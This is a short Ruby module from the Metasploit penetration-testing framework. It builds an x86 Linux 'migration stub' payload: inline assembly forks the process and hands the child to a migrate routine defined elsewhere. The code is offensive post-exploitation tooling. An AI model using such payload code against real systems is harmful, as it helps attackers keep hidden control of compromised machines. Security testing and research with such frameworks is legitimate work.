# -*- coding: binary -*-

module Msf

###
#
# Payload that supports migration on x86.
#
###

module Payload::Linux::X86::Migrate


  def initialize(info={})
    super(update_info(info,
      'Name'        => 'Linux Migration (x86)',
      'Description' => 'Migration stub x86',
      'Author'      => ['OJ Reeves', 'msutovsky-r7'],
      'License'     => MSF_LICENSE,
      'Platform'    => 'linux',
      'Arch'        => ARCH_X86
    ))
  end

  #
  # Constructs the migrate stub on the fly
  #
  def generate(opts={})
    # eax - payload address
    # ebx - current pid
    # ecx - fd
    asm = %Q^
      push eax ; payload address
      push ecx ; fd
      push ebx ; current pid
      xor eax, eax
      push 0x2
      pop eax
      int 0x80
      cmp eax, 0
      jz _exec_child
_exec_parent:
      int 3
_exec_child
      #{migrate_stub(opts)}
    ^
    Metasm::Shellcode.assemble(Metasm::X86.new, asm).encode_string
  end

end

end

